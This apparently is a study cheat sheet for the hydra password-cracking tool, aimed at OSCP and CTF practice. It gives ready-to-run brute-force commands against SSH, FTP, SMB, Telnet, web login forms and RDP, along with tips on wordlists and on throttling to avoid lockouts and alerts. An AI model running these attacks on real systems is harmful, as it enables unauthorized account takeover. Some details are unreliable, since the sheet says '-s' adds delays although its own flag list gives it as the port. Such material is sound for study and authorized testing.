
# Hydra Cheat Sheet

A concise, exam-friendly cheat sheet for **hydra** (a popular parallelized login cracker).  
**Use only on systems you are authorized to test** (lab, CTF, or with written permission).

> **Warning:** Unauthorized use of hydra is illegal. Always have explicit permission.

---

## Common Flags & Options
```
-h                # help
-l <user>         # single username
-L <userlist>     # username list file
-p <pass>         # single password
-P <passlist>     # password list file
-s <port>         # specify port
-t <tasks>        # number of parallel tasks (threads)
-w <wait>         # wait time between attempts (seconds)
-f                # exit on first found login pair
-o <outfile>      # write cracked pairs to file
-V                # verbose mode (show each attempt)
-M <hostsfile>    # multiple target hosts (one per line)
```

---

## Wordlist Tips
- Use curated lists: `rockyou.txt`, `common-usernames.txt`, `top-1000-passwords.txt`.
- For exams/CTFs, tailor wordlists (company names, user naming conventions).
- Combine and filter with `crunch`, `cewl`, `john --wordlist-format`, or `maskprocessor`.

---

## Examples (Authorized Use Only)

### SSH (single user)
```bash
hydra -l alice -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5 -t 4 -f -o hydra_ssh_alice.txt
```

### SSH (username list + password list)
```bash
hydra -L users.txt -P passwords.txt ssh://10.10.10.5 -t 6 -f -o hydra_ssh_results.txt
```

### FTP
```bash
hydra -L users.txt -P passwords.txt ftp://10.10.10.20 -t 6 -f -o hydra_ftp.txt
```

### SMB (using smb module)
```bash
hydra -L users.txt -P passwords.txt smb://10.10.10.30 -t 8 -f -o hydra_smb.txt
```

### Telnet
```bash
hydra -L users.txt -P passwords.txt telnet://10.10.10.40 -s 23 -t 6 -f -o hydra_telnet.txt
```

### HTTP Form (POST) — web login forms
- You need to supply the form fields and success/failure strings. Hydra's `http-post-form` syntax:
```
hydra -L users.txt -P passwords.txt 10.10.10.50 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -t 8 -f -o hydra_http.txt
```
- Replace `/login.php`, parameter names, and the failure string with values observed from the target (only authorized testing).

### RDP (NLA disabled)
```bash
hydra -L users.txt -P passwords.txt rdp://10.10.10.60 -t 4 -f -o hydra_rdp.txt
```

---

## Parallelization & Performance
- `-t` increases concurrent threads. Higher `-t` is faster but more likely to trigger IDS/IPS or lockouts.
- Use `-w` (wait) or `-s` (small delays) to throttle attempts when necessary.
- On multi-host scans, use `-M hosts.txt` to distribute load across targets.

---

## Output Handling
- Use `-o` to save results; inspect files immediately and securely delete sensitive materials after the engagement.
- Example: `-o hydra_results.txt`
- Consider piping stderr/stdout to logs for post-analysis.

---

## Defensive Considerations
- Brute-force attempts are noisy — they'll typically generate logs and alerts. Use caution.
- Many services will have account lockout policies. Adjust attack speed and strategy.
- Prefer credential stuffing with valid lists (from the engagement scope) over blind brute force where possible.

---

## Alternatives & Complementary Tools
- `medusa`, `ncrack`, `patator` — similar functionality with different features.
- `hydra` is good for parallel brute forcing; `ncrack` is sometimes better for modern protocols.

---

## Quick Workflow for an Exam/CTF (Authorized)
1. Enumerate reachable services (`nmap`, `smbclient`, `rpcclient`).
2. Identify valid usernames (public info, `enum4linux`, `smbmap`, `ldapsearch`).
3. Tailor wordlists to the target.
4. Start with conservative `-t` and `-w` to detect behavior.
5. Monitor target for lockouts or alerts.
6. Save and document results.

---

## Further Reading
- `man hydra`
- Official hydra GitHub / documentation
- OSCP / PWK course materials (follow your exam rules)

---

*Generated for study and authorized pentesting practice. Use responsibly.*